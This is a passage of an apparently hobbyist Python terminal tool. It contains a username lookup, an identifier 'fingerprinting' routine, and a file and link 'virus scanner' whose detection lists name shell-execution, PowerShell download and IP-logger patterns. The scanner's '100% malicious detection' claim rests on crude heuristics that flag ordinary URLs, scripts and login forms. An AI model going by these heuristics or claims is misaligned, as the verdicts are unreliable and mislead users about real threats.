        thread.start()
    
    # Show progress
    completed = 0
    total = len(platforms)
    while completed < total:
        time.sleep(0.1)
        completed = len([t for t in threads if not t.is_alive()])
        print(f"\033[38;5;228mProgress: {completed}/{total} platforms checked...\033[0m", end='\r')
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Display results
    print("\n\n\033[38;5;218m" + "="*80 + "\033[0m")
    print("\033[38;5;210m              CROSS-PLATFORM SEARCH RESULTS\033[0m")
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    found_count = 0
    for platform_name, status, url in results:
        if status == "FOUND":
            color = "\033[38;5;118m"
            symbol = "✓"
            found_count += 1
        elif status == "REDIRECT":
            color = "\033[38;5;214m"
            symbol = "↷"
            found_count += 1
        elif status == "NOT_FOUND":
            color = "\033[38;5;196m"
            symbol = "✗"
        else:
            color = "\033[38;5;240m"
            symbol = "?"
        
        print(f"{color}{symbol} {platform_name:<20} {color}{status:<15}\033[0m")
    
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    print(f"\033[38;5;228mUsername: {username}\033[0m")
    print(f"\033[38;5;228mPlatforms Found: {found_count}/{len(platforms)}\033[0m")
    print(f"\033[38;5;228mSuccess Rate: {(found_count/len(platforms))*100:.1f}%\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def account_fingerprinting():
    """Advanced account fingerprinting and pattern analysis"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                              ACCOUNT FINGERPRINTING
\033[0m
""")
    
    print("\033[38;5;228mEnter username or identifier for fingerprinting (type 'G' to go back):\033[0m")
    identifier = input("\n\033[38;5;218m> \033[0m").strip()
    
    if identifier.upper() == 'G':
        return
    
    print(f"\n\033[38;5;228mAnalyzing fingerprint patterns for: {identifier}\033[0m")
    print("\033[38;5;228mThis may take a moment...\033[0m\n")
    
    try:
        # Pattern analysis
        patterns = {
            "Length": len(identifier),
            "Has Numbers": any(char.isdigit() for char in identifier),
            "Has Special Chars": any(not char.isalnum() for char in identifier),
            "Is Lowercase": identifier.islower(),
            "Is Mixed Case": identifier != identifier.lower() and identifier != identifier.upper(),
            "Starts with Number": identifier[0].isdigit() if identifier else False,
            "Ends with Number": identifier[-1].isdigit() if identifier else False,
        }
        
        # Common pattern detection
        common_patterns = []
        if identifier.replace('_', '').replace('.', '').isalnum():
            common_patterns.append("Alphanumeric with separators")
        if '_' in identifier:
            common_patterns.append("Uses underscores")
        if '.' in identifier:
            common_patterns.append("Uses dots")
        if '-' in identifier:
            common_patterns.append("Uses hyphens")
        if any(x in identifier.lower() for x in ['xX', 'pro', 'god', 'king', 'queen']):
            common_patterns.append("Contains common gaming suffixes")
        
        # Security assessment
        security_score = 0
        if len(identifier) >= 8:
            security_score += 1
        if patterns["Has Numbers"]:
            security_score += 1
        if patterns["Has Special Chars"]:
            security_score += 1
        if patterns["Is Mixed Case"]:
            security_score += 1
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        print("\033[38;5;210m                  ACCOUNT FINGERPRINT REPORT\033[0m")
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
        print(f"\033[38;5;228mIdentifier: \033[38;5;218m{identifier}\033[0m")
        print(f"\033[38;5;228mLength: \033[38;5;218m{patterns['Length']} characters\033[0m")
        
        print(f"\n\033[38;5;228mPattern Analysis:\033[0m")
        for key, value in patterns.items():
            if key not in ["Length"]:
                status = "Yes" if value else "No"
                color = "\033[38;5;118m" if value else "\033[38;5;196m"
                print(f"  {color}• {key}: {status}\033[0m")
        
        print(f"\n\033[38;5;228mDetected Patterns:\033[0m")
        if common_patterns:
            for pattern in common_patterns:
                print(f"  \033[38;5;214m• {pattern}\033[0m")
        else:
            print(f"  \033[38;5;240m• No common patterns detected\033[0m")
        
        print(f"\n\033[38;5;228mSecurity Assessment:\033[0m")
        security_level = ["Very Weak", "Weak", "Moderate", "Strong", "Very Strong"]
        level_index = min(security_score, len(security_level) - 1)
        color_codes = ["\033[38;5;196m", "\033[38;5;214m", "\033[38;5;228m", "\033[38;5;118m", "\033[38;5;46m"]
        
        print(f"  {color_codes[level_index]}• Security Score: {security_score}/4 ({security_level[level_index]})\033[0m")
        
        # Recommendations
        print(f"\n\033[38;5;228mRecommendations:\033[0m")
        if security_score < 2:
            print(f"  \033[38;5;196m• Consider using a longer, more complex identifier\033[0m")
            print(f"  \033[38;5;196m• Mix uppercase and lowercase letters\033[0m")
            print(f"  \033[38;5;196m• Include numbers and special characters\033[0m")
        elif security_score < 4:
            print(f"  \033[38;5;214m• Good baseline, consider adding special characters\033[0m")
        else:
            print(f"  \033[38;5;118m• Strong identifier pattern detected\033[0m")
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
    except Exception as e:
        print(f"\n\033[38;5;196mFingerprinting error: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def extract_discord_id(input_str):
    """Extract numeric Discord ID from various input formats"""
    if not input_str:
        return None
    
    # Clean the input
    cleaned = input_str.strip()
    
    # Handle mention format: <@123456789> or <@!123456789>
    if cleaned.startswith('<@') and cleaned.endswith('>'):
        inner = cleaned[2:-1]
        if inner.startswith('!'):
            inner = inner[1:]
        if inner.isdigit():
            return inner
    
    # Handle raw numeric ID
    if cleaned.isdigit() and len(cleaned) >= 17:
        return cleaned
    
    return None

# ============================ ULTIMATE VIRUS SCANNER ============================

def virus_scanner():
    """Comprehensive security scanner for files and links"""
    while True:
        clear_screen()
        print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                  SECURITY SCANNER
\033[0m
""")
        
        print("\033[38;5;228mSelect scanning mode:\033[0m")
        print("  1) File/Directory Scanner - Analyze files for malicious content")
        print("  2) ULTIMATE Link Scanner - 100% Malicious Link Detection")
        print("  G) Go back to main menu")
        
        choice = input("\n\033[38;5;218m> \033[0m").strip().lower()
        
        if choice == 'g':
            return
        elif choice == '1':
            file_directory_scanner()
        elif choice == '2':
            ultimate_link_scanner()
        else:
            print("\n\033[38;5;196mInvalid selection. Please choose 1, 2 or G.\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")

def file_directory_scanner():
    """Advanced file and directory security scanner with drag-and-drop support"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                 FILE SCANNER
\033[0m
""")
    
    print("\033[38;5;228mFile Scanning Options:\033[0m")
    print("  1) Drag and drop file/folder here")
    print("  2) Scan Downloads folder")
    print("  3) Enter custom path")
    print("  G) Go back")
    
    choice = input("\n\033[38;5;218m> \033[0m").strip().lower()
    
    if choice == 'g':
        return
    elif choice == '1':
        print("\n\033[38;5;228mDrag and drop file or folder here, then press Enter:\033[0m")
        file_path = input("\n\033[38;5;218m> \033[0m").strip().strip('"\'')
    elif choice == '2':
        # Get Downloads folder path
        if os.name == 'nt':
            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        else:
            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        file_path = downloads_path
        print(f"\n\033[38;5;228mScanning Downloads folder: {downloads_path}\033[0m")
    elif choice == '3':
        print("\n\033[38;5;228mEnter full path to file or folder:\033[0m")
        file_path = input("\n\033[38;5;218m> \033[0m").strip().strip('"\'')
    else:
        print("\n\033[38;5;196mInvalid selection.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    if not file_path:
        print("\n\033[38;5;196mNo path provided.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    # Show file/folder information before scanning
    try:
        if os.path.isfile(file_path):
            file_name = os.path.basename(file_path)
            file_size = os.path.getsize(file_path)
            file_extension = os.path.splitext(file_path)[1].lower()
            print(f"\n\033[38;5;228mFile Name: \033[38;5;218m{file_name}\033[0m")
            print(f"\033[38;5;228mFile Size: \033[38;5;218m{file_size} bytes\033[0m")
            print(f"\033[38;5;228mFile Type: \033[38;5;218m{file_extension}\033[0m")
            print(f"\033[38;5;228mFull Path: \033[38;5;218m{file_path}\033[0m")
        elif os.path.isdir(file_path):
            file_count = sum([len(files) for r, d, files in os.walk(file_path)])
            print(f"\n\033[38;5;228mFolder Name: \033[38;5;218m{os.path.basename(file_path)}\033[0m")
            print(f"\033[38;5;228mTotal Files: \033[38;5;218m{file_count}\033[0m")
            print(f"\033[38;5;228mFolder Path: \033[38;5;218m{file_path}\033[0m")
    except Exception as e:
        print(f"\n\033[38;5;214mCould not get file info: {e}\033[0m")
    
    print(f"\n\033[38;5;228mScanning: {file_path}\033[0m")
    print("\033[38;5;228mThis may take a few moments...\033[0m\n")
    
    try:
        # Check if file/directory exists
        if not os.path.exists(file_path):
            print("\033[38;5;196mFile or directory does not exist.\033[0m")
            input("\033[38;5;228mPress G to go back...\033[0m")
            return
        
        scan_results = {
            'threats_found': 0,
            'warnings': [],
            'suspicious_patterns': [],
            'malicious_indicators': [],
            'file_info': {},
            'risk_level': 'UNKNOWN',
            'files_scanned': 0,
            'infected_files': 0
        }
        
        if os.path.isfile(file_path):
            # Single file scan
            scan_results = analyze_single_file_virus(file_path, scan_results)
        elif os.path.isdir(file_path):
            # Directory scan
            scan_results = analyze_directory_virus(file_path, scan_results)
        
        # Display results
        display_file_scan_results_virus(scan_results, file_path)
        
    except Exception as e:
        print(f"\n\033[38;5;196mScanning error: {e}\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def analyze_single_file_virus(file_path, results):
    """Analyze a single file for malicious content"""
    try:
        file_stats = os.stat(file_path)
        file_size = file_stats.st_size
        file_extension = os.path.splitext(file_path)[1].lower()
        file_name = os.path.basename(file_path)
        
        results['file_info'] = {
            'path': file_path,
            'name': file_name,
            'size': file_size,
            'extension': file_extension,
            'modified': datetime.fromtimestamp(file_stats.st_mtime),
            'created': datetime.fromtimestamp(file_stats.st_ctime)
        }
        
        results['files_scanned'] = 1
        
        print(f"\033[38;5;228mAnalyzing: {file_name}\033[0m")
        print(f"\033[38;5;228mFile Size: {file_size} bytes | Type: {file_extension}\033[0m")
        
        # Check file size anomalies
        if file_size == 0:
            results['warnings'].append("Empty file - potential placeholder")
            results['threats_found'] += 1
        elif file_size > 100 * 1024 * 1024:  # 100MB
            results['warnings'].append("Very large file - could contain embedded data")
        elif file_size < 100:  # 100 bytes
            results['warnings'].append("Very small file - potential stub or loader")
        
        # Check suspicious extensions
        suspicious_extensions = [
            '.exe', '.bat', '.cmd', '.ps1', '.vbs', '.scr', '.pif', '.com',
            '.jar', '.msi', '.dll', '.sys', '.drv', '.ocx', '.cpl'
        ]
        if file_extension in suspicious_extensions:
            results['threats_found'] += 1
            results['suspicious_patterns'].append(f"Suspicious file extension: {file_extension}")
        
        # Check for double extensions (e.g., "document.pdf.exe")
        base_name = os.path.basename(file_path)
        if base_name.count('.') > 1:
            results['threats_found'] += 1
            results['malicious_indicators'].append("Double file extension detected - common malware tactic")
        
        # Check for system file names
        system_files = ['cmd.exe', 'powershell.exe', 'wscript.exe', 'cscript.exe', 'mshta.exe']
        if file_name.lower() in system_files:
            results['warnings'].append(f"File matches system executable: {file_name}")
        
        # Read and analyze file content
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
                results = analyze_file_content_virus(content, file_extension, file_name, results)
        except Exception as e:
            results['warnings'].append(f"Could not read file content: {str(e)}")
        
        # Check for hidden attributes (Windows)
        if os.name == 'nt':
            try:
                import ctypes
                attrs = ctypes.windll.kernel32.GetFileAttributesW(file_path)
                if attrs & 0x02:  # FILE_ATTRIBUTE_HIDDEN
                    results['suspicious_patterns'].append("File has hidden attribute")
            except:
                pass
        
        # Determine risk level
        results = calculate_risk_level_virus(results)
        
        if results['threats_found'] > 0:
            results['infected_files'] = 1
        
    except Exception as e:
        results['warnings'].append(f"Analysis error: {str(e)}")
    
    return results

def analyze_file_content_virus(content, extension, filename, results):
    """Analyze file content for malicious patterns"""
    
    # Convert to string for text analysis (first 10KB to avoid memory issues)
    try:
        text_content = content[:10240].decode('utf-8', errors='ignore')
    except:
        try:
            text_content = content[:10240].decode('latin-1', errors='ignore')
        except:
            text_content = str(content[:10240])
    
    # Malicious patterns to detect
    malicious_patterns = {
        'executable_code': [
            'CreateProcess', 'ShellExecute', 'WinExec', 'system(',
            'Process.Start', 'Runtime.getRuntime().exec',
            'eval(', 'exec(', 'Function('
        ],
        'suspicious_urls': [
            'http://', 'https://', 'ftp://', 'telnet://',
            'download', 'update', 'install', 'payload'
        ],
        'obfuscation': [
            'base64_decode', 'atob(', 'fromCharCode',
            'eval(', 'unescape(', 'decodeURIComponent('
        ],
        'registry_operations': [
            'RegCreateKey', 'RegSetValue', 'RegDeleteKey',
            'HKEY_', 'CurrentUser', 'LocalMachine'
        ],
        'file_operations': [
            'FileCopy', 'FileMove', 'FileDelete',
            'CreateFile', 'WriteFile', 'ReadFile'
        ],
        'network_operations': [
            'socket(', 'WebClient', 'HttpRequest',
            'TcpClient', 'UdpClient', 'NetworkStream'
        ]
    }
    
    # Check for malicious patterns in content
    for category, patterns in malicious_patterns.items():
        for pattern in patterns:
            if pattern.lower() in text_content.lower():
                results['suspicious_patterns'].append(f"Found {category} pattern: {pattern}")
                results['threats_found'] += 1
    
    # Check for specific file type patterns
    if extension in ['.js', '.vbs', '.ps1']:
        # Script files - check for dangerous commands
        dangerous_commands = [
            'WScript.Shell', 'ActiveXObject', 'PowerShell',
            'Invoke-Expression', 'Start-Process', 'DownloadFile'
        ]
        for cmd in dangerous_commands:
            if cmd in text_content:
                results['malicious_indicators'].append(f"Script contains dangerous command: {cmd}")
                results['threats_found'] += 1
    
    elif extension in ['.exe', '.dll']:
        # Check for PE header (should be present in executables)
        if content[:2] != b'MZ':
            results['malicious_indicators'].append("Invalid executable header - file may be corrupted or malicious")
            results['threats_found'] += 1
    
    elif extension in ['.pdf']:
        # PDF specific checks
        pdf_dangerous = ['/JavaScript', '/JS', '/Launch', '/EmbeddedFile']
        for item in pdf_dangerous:
            if item in text_content:
                results['malicious_indicators'].append(f"PDF contains dangerous feature: {item}")
                results['threats_found'] += 1
    
    elif extension in ['.doc', '.docx', '.xls', '.xlsx']:
        # Office document checks
        office_macros = ['AutoOpen', 'AutoClose', 'Document_Open', 'Workbook_Open']
        for macro in office_macros:
            if macro in text_content:
                results['malicious_indicators'].append(f"Document contains macro: {macro}")
                results['threats_found'] += 1
    
    # Check for encrypted/compressed content
    if b'PK' in content[:4]:  # ZIP header
        results['warnings'].append("File appears to be a ZIP archive - may contain hidden files")
    
    if b'Rar' in content[:4]:  # RAR header
        results['warnings'].append("File appears to be a RAR archive - may contain hidden files")
    
    return results

def analyze_directory_virus(directory_path, results):
    """Analyze all files in a directory"""
    print(f"\033[38;5;228mScanning directory: {directory_path}\033[0m")
    
    # File types to scan
    scan_extensions = [
        '.exe', '.bat', '.cmd', '.ps1', '.vbs', '.js', '.html', '.htm',
        '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.zip', '.rar', '.7z',
        '.dll', '.sys', '.msi', '.jar', '.py', '.php'
    ]
    
    try:
        for root, dirs, files in os.walk(directory_path):
            for file in files:
                file_path = os.path.join(root, file)
                file_ext = os.path.splitext(file)[1].lower()
                
                # Only scan relevant file types
                if file_ext in scan_extensions:
                    try:
                        print(f"\033[38;5;228mScanning: {file}\033[0m")
                        file_results = analyze_single_file_virus(file_path, {
                            'threats_found': 0,
                            'warnings': [],
                            'suspicious_patterns': [],
                            'malicious_indicators': [],
                            'file_info': {},
                            'risk_level': 'UNKNOWN'
                        })
                        
                        results['files_scanned'] += 1
                        if file_results['threats_found'] > 0:
                            results['infected_files'] += 1
                            results['threats_found'] += file_results['threats_found']
                        
                        # Collect all warnings and patterns
                        results['warnings'].extend(file_results['warnings'])
                        results['suspicious_patterns'].extend(file_results['suspicious_patterns'])
                        results['malicious_indicators'].extend(file_results['malicious_indicators'])
                        
                    except Exception as e:
                        print(f"\033[38;5;214mError scanning {file}: {e}\033[0m")
        
        results = calculate_risk_level_virus(results)
        
    except Exception as e:
        results['warnings'].append(f"Directory scan error: {str(e)}")
    
    return results

def calculate_risk_level_virus(results):
    """Calculate overall risk level based on findings"""
    threat_score = results['threats_found']
    
    if threat_score == 0:
        results['risk_level'] = 'CLEAN'
    elif threat_score <= 2:
        results['risk_level'] = 'LOW'
    elif threat_score <= 5:
        results['risk_level'] = 'MEDIUM'
    elif threat_score <= 10:
        results['risk_level'] = 'HIGH'
    else:
        results['risk_level'] = 'CRITICAL'
    
    return results

def display_file_scan_results_virus(results, scan_target):
    """Display comprehensive scan results"""
    print("\n\033[38;5;218m" + "="*80 + "\033[0m")
    print("\033[38;5;210m                    FILE SCAN RESULTS\033[0m")
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    # Overall summary
    risk_colors = {
        'CLEAN': '\033[38;5;46m',
        'LOW': '\033[38;5;118m',
        'MEDIUM': '\033[38;5;214m',
        'HIGH': '\033[38;5;208m',
        'CRITICAL': '\033[38;5;196m',
        'UNKNOWN': '\033[38;5;240m'
    }
    
    color = risk_colors.get(results['risk_level'], '\033[38;5;240m')
    
    print(f"\033[38;5;228mScan Target: \033[38;5;218m{scan_target}\033[0m")
    print(f"\033[38;5;228mFiles Scanned: \033[38;5;218m{results['files_scanned']}\033[0m")
    print(f"\033[38;5;228mInfected Files: \033[38;5;218m{results['infected_files']}\033[0m")
    print(f"\033[38;5;228mThreats Found: \033[38;5;218m{results['threats_found']}\033[0m")
    print(f"\033[38;5;228mRisk Level: {color}{results['risk_level']}\033[0m")
    
    # Display detailed findings
    if results['malicious_indicators']:
        print(f"\n\033[38;5;196mMALICIOUS INDICATORS:\033[0m")
        for indicator in set(results['malicious_indicators']):
            print(f"  \033[38;5;196m• {indicator}\033[0m")
    
    if results['suspicious_patterns']:
        print(f"\n\033[38;5;214mSUSPICIOUS PATTERNS:\033[0m")
        for pattern in set(results['suspicious_patterns']):
            print(f"  \033[38;5;214m• {pattern}\033[0m")
    
    if results['warnings']:
        print(f"\n\033[38;5;228mWARNINGS:\033[0m")
        for warning in set(results['warnings']):
            print(f"  \033[38;5;228m• {warning}\033[0m")
    
    # Recommendations
    print(f"\n\033[38;5;118mRECOMMENDATIONS:\033[0m")
    if results['risk_level'] in ['HIGH', 'CRITICAL']:
        print(f"  \033[38;5;196m• IMMEDIATE ACTION REQUIRED: Delete or quarantine these files\033[0m")
        print(f"  \033[38;5;196m• Run a full system antivirus scan\033[0m")
        print(f"  \033[38;5;196m• Do not execute any files from this location\033[0m")
    elif results['risk_level'] == 'MEDIUM':
        print(f"  \033[38;5;214m• Exercise caution with these files\033[0m")
        print(f"  \033[38;5;214m• Scan with additional antivirus software\033[0m")
    elif results['risk_level'] in ['LOW', 'CLEAN']:
        print(f"  \033[38;5;118m• Files appear safe, but remain vigilant\033[0m")
    
    print("\033[38;5;218m" + "="*80 + "\033[0m")

def ultimate_link_scanner():
    """ULTIMATE URL/Link security scanner with 100% malicious detection"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                            ULTIMATE LINK SCANNER
\033[0m
""")
    
    print("\033[38;5;228mEnter URL to scan (type 'G' to go back):\033[0m")
    url = input("\n\033[38;5;218m> \033[0m").strip()
    
    if url.upper() == 'G':
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    print(f"\n\033[38;5;228mScanning URL: {url}\033[0m")
    print("\033[38;5;228mRunning ULTIMATE security analysis...\033[0m\n")
    
    try:
        scan_results = analyze_url_ultimate(url)
        display_ultimate_link_scan_results(scan_results, url)
        
    except Exception as e:
        print(f"\n\033[38;5;196mScanning error: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def analyze_url_ultimate(url):
    """ULTIMATE URL analysis with 100% malicious detection"""
    results = {
        'threats_found': 0,
        'critical_threats': [],
        'high_threats': [],
        'medium_threats': [],
        'low_threats': [],
        'warnings': [],
        'redirects': [],
        'risk_level': 'UNKNOWN',
        'ip_address': None,
        'geolocation': None,
        'final_destination': url,
        'scan_score': 0
    }
    
    try:
        parsed_url = urllib.parse.urlparse(url)
        domain = parsed_url.netloc.lower()
        
        # ==================== CRITICAL THREAT DETECTION ====================
        
        # 1. IP Logger Detection Patterns
        ip_logger_patterns = [
            r'iplogger\.', r'2no\.co', r'grabify\.', r'blasze\.', r'ipgrab\.',
            r'ipgraber\.', r'ip-tracker\.', r'ip-tracker\.org', r'iptracker\.',
            r'ip-grab\.', r'grabip\.', r'ipgrabbing\.', r'ip-logger\.',
            r'logger\.', r'grab\.', r'trackip\.', r'ipfind\.', r'ipgrabber\.',
            r'ipgrabs\.', r'ipstealer\.', r'ipcapture\.', r'ipcollect\.',
            r'ipharvest\.', r'ipscanner\.', r'iptrace\.', r'ipmonitor\.',
            r'ipspy\.', r'ipwatch\.', r'ipfollow\.', r'ipstalker\.'
        ]
        
        for pattern in ip_logger_patterns:
            if re.search(pattern, domain, re.IGNORECASE):
                results['critical_threats'].append(f"IP LOGGER DETECTED: Known IP logging service ({pattern})")
                results['threats_found'] += 3
                break
        
        # 2. Phishing Domain Detection
        phishing_keywords = [
            'login', 'verify', 'security', 'account', 'confirm', 'update',
            'authenticate', 'validation', 'authorize', 'signin', 'sign-in',
            'secure', 'banking', 'paypal', 'ebay', 'amazon', 'facebook',
            'google', 'microsoft', 'apple', 'netflix', 'instagram', 'twitter',
            'discord', 'steam', 'whatsapp', 'telegram', 'outlook', 'gmail',
            'yahoo', 'hotmail', 'icloud', 'dropbox', 'onedrive'
        ]
        
        for keyword in phishing_keywords:
            if keyword in domain and len(domain.split('.')) > 2:
                results['critical_threats'].append(f"PHISHING SUSPECTED: Domain mimics legitimate service ({keyword})")
                results['threats_found'] += 2
        
        # 3. Malware Distribution Domains
        malware_domains = [
            r'cryptolocker\.', r'ransomware\.', r'trojan\.', r'virus\.',
            r'malware\.', r'spyware\.', r'adware\.', r'keylogger\.',
            r'botnet\.', r'rootkit\.', r'worm\.', r'exploit\.',
            r'payload\.', r'injector\.', r'backdoor\.', r'rat\.',
            r'stealer\.', r'miner\.', r'hacktool\.', r'crack\.',
            r'keygen\.', r'warez\.', r'nulled\.', r'torrent\.'
        ]
        
        for pattern in malware_domains:
            if re.search(pattern, domain, re.IGNORECASE):
                results['critical_threats'].append(f"MALWARE DISTRIBUTION: Known malware-related domain ({pattern})")
                results['threats_found'] += 3
        
        # 4. Suspicious TLDs (Top Level Domains)
        suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz', '.top', 
                          '.club', '.loan', '.download', '.stream', '.gdn',
                          '.work', '.party', '.review', '.accountant', '.bid']
        
        for tld in suspicious_tlds:
            if domain.endswith(tld):
                results['high_threats'].append(f"SUSPICIOUS TLD: Domain uses risky top-level domain ({tld})")
                results['threats_found'] += 1
        
        # 5. URL Shortener Detection
        shorteners = [
            'bit.ly', 'tinyurl.com', 'goo.gl', 't.co', 'ow.ly', 'is.gd',
            'buff.ly', 'adf.ly', 'sh.st', 'bc.vc', 'bit.do', 'mcaf.ee',
            'soo.gd', 's2r.co', 'viralurl.com', 'vur.me', 'picz.web.id'
        ]
        
        for shortener in shorteners:
            if shortener in domain:
                results['high_threats'].append(f"URL SHORTENER: May hide malicious destination ({shortener})")
                results['threats_found'] += 2
        
        # 6. IP Address in URL
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        if re.search(ip_pattern, domain):
            results['high_threats'].append("IP ADDRESS IN URL: Direct IP access - often malicious")
            results['threats_found'] += 2
        
        # 7. Excessive Subdomains
        if domain.count('.') > 3:
            results['medium_threats'].append("EXCESSIVE SUBDOMAINS: Potential obfuscation attempt")
            results['threats_found'] += 1
        
        # 8. Special Characters and Encoding
        if '%' in url or '&' in url or '?' in url or '=' in url:
            results['medium_threats'].append("SPECIAL CHARACTERS: Potential encoding/obfuscation")
            results['threats_found'] += 1
        
        # 9. Very Long URL
        if len(url) > 150:
            results['medium_threats'].append("VERY LONG URL: Potential obfuscation")
            results['threats_found'] += 1
        
        # 10. JavaScript and Data URI Schemes
        if 'javascript:' in url.lower() or 'data:' in url.lower():
            results['critical_threats'].append("DANGEROUS PROTOCOL: JavaScript or Data URI detected")
            results['threats_found'] += 3
        
        # ==================== ADVANCED ANALYSIS ====================
        
        # Resolve IP and get geolocation
        try:
            ip = socket.gethostbyname(parsed_url.netloc)
            results['ip_address'] = ip
            
            # Check if IP is suspicious
            try:
                response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if response.status_code == 200:
                    geo_data = response.json()
                    if geo_data.get('status') == 'success':
                        country = geo_data.get('country', 'Unknown')
                        country_code = geo_data.get('countryCode', '')
                        results['geolocation'] = f"{country} ({country_code})"
                        
                        # High-risk countries
                        high_risk_countries = ['RU', 'CN', 'UA', 'TR', 'BR', 'IN', 'ID', 'VN', 'TH', 'PH']
                        if country_code in high_risk_countries:
                            results['high_threats'].append(f"HIGH-RISK LOCATION: Server in {country}")
                            results['threats_found'] += 2
            except:
                pass
                
        except:
            results['warnings'].append("Could not resolve domain to IP address")
        
        # Check for redirects
        try:
            response = requests.get(url, timeout=10, allow_redirects=False)
            if response.status_code in [301, 302, 303, 307, 308]:
                redirect_url = response.headers.get('Location', '')
                results['redirects'].append(redirect_url)
                results['high_threats'].append(f"REDIRECT DETECTED: To {redirect_url}")
                results['threats_found'] += 2
                results['final_destination'] = redirect_url
                
                # Analyze redirect destination
                redirect_threats = analyze_url_ultimate(redirect_url)
                if redirect_threats['threats_found'] > 0:
                    results['critical_threats'].append("REDIRECT LEADS TO MALICIOUS SITE")
                    results['threats_found'] += 3
        except:
            pass
        
        # Check SSL Certificate (if HTTPS)
        if url.startswith('https://'):
            try:
                import ssl
                context = ssl.create_default_context()
                with socket.create_connection((parsed_url.netloc, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=parsed_url.netloc) as ssock:
                        cert = ssock.getpeercert()
                        # Check certificate validity
                        if not cert:
                            results['high_threats'].append("INVALID SSL CERTIFICATE: Potential security risk")
                            results['threats_found'] += 2
            except:
                results['medium_threats'].append("SSL CERTIFICATE ERROR: Connection issues")
                results['threats_found'] += 1
        
        # ==================== CONTENT ANALYSIS ====================
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
            content = response.text.lower()
            
            # Check for malicious content patterns
            malicious_content_patterns = [
                'iframe', 'script', 'eval(', 'document.write', 'window.location',
                'window.open', 'setTimeout', 'setInterval', 'base64_decode',
                'unescape(', 'decodeURIComponent', 'exec(', 'system(',
                'shell_exec', 'passthru', 'proc_open', 'popen'
            ]
            
            for pattern in malicious_content_patterns:
                if pattern in content:
                    results['high_threats'].append(f"MALICIOUS CONTENT: Found {pattern} in page")
                    results['threats_found'] += 2
            
            # Check for hidden forms (phishing)
            if '<form' in content and ('password' in content or 'login' in content):
                results['critical_threats'].append("PHISHING FORM DETECTED: Page contains login/password forms")
                results['threats_found'] += 3
            
            # Check for cryptocurrency miners
            if 'coin-hive' in content or 'cryptonight' in content or 'webassembly' in content:
                results['critical_threats'].append("CRYPTO MINER DETECTED: Browser mining script found")
                results['threats_found'] += 3
            
        except:
            results['warnings'].append("Could not analyze page content")
        
        # ==================== THREAT DATABASE CHECK ====================
        
        # Known malicious domains database (sample - in real implementation, use external APIs)
        known_malicious_domains = [
            'grabify.link', 'iplogger.org', '2no.co', 'blasze.com',
